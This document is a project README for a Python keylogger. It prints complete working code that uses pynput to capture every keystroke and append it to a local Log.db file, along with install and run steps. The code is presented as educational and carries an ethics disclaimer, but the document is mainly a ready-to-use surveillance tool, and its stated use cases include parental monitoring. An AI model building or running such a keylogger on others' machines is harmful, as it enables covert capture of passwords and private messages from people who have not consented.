# 🔑 KeyLogger

A lightweight Python-based keylogger built for **educational purposes** and **cybersecurity research**. Captures keystrokes and logs them to a local file using the `pynput` library.

> ⚠️ **Disclaimer**: This tool is intended strictly for ethical use — authorized penetration testing, security research, or learning purposes only. Unauthorized use of keyloggers is **illegal** and **unethical**. Always obtain explicit permission before deploying on any system.

---

## 📋 Features

- Captures all keystrokes in real-time
- Handles special keys (`Space`, `Enter`, `Shift`, etc.)
- Logs output to a local `Log.db` file
- Minimal footprint — single Python script

---

## 🛠️ Tech Stack

- **Language**: Python 3
- **Library**: [`pynput`](https://pypi.org/project/pynput/)

---

## 📦 Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/yourusername/keylogger.git
   cd keylogger
   ```

2. **Install dependencies**
   ```bash
   pip install pynput
   ```

---

## 🚀 Usage

```bash
python keylogger.py
```

- The script will start listening for keystrokes immediately.
- All captured input is appended to `Log.db` in the same directory.
- Press `Ctrl+C` to stop the listener.

---

## 📁 Project Structure

```
keylogger/
├── keylogger.py     # Main script
├── Log.db           # Output log file (auto-generated on run)
└── README.md        # Project documentation
```

---

## 🔍 How It Works

```python
from pynput.keyboard import Listener

def log_pressed_key(key):
    # Normalize key representation
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.shift':
        key = ''

    # Append keystroke to log file
    with open("Log.db", 'a') as f:
        f.write(key)

with Listener(on_press=log_pressed_key) as l:
    l.join()
```

The `pynput` `Listener` hooks into system keyboard events. Each keypress is normalized — special keys like `space` and `enter` are converted to their readable equivalents — and written to `Log.db`.

---

## ⚙️ Configuration

| Parameter | Default  | Description                        |
|-----------|----------|------------------------------------|
| Log file  | `Log.db` | File where keystrokes are saved    |

To change the output file, edit the filename in `keylogger.py`:
```python
with open("your_custom_log.txt", 'a') as f:
```

---

## 🔐 Ethical Use Cases

- Learning how input capture works at the OS level
- Authorized red team / penetration testing engagements
- Parental monitoring (with full consent and disclosure)
- Academic research in cybersecurity

---

## 🧪 Testing Environment

Tested on:
- Windows 10/11
- Python 3.8+

---

## 📄 License

This project is licensed under the [MIT License](LICENSE).

---

## 🙋‍♂️ Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you'd like to change.

---

## 📬 Contact

For questions or responsible disclosure, open an issue or reach out via GitHub.
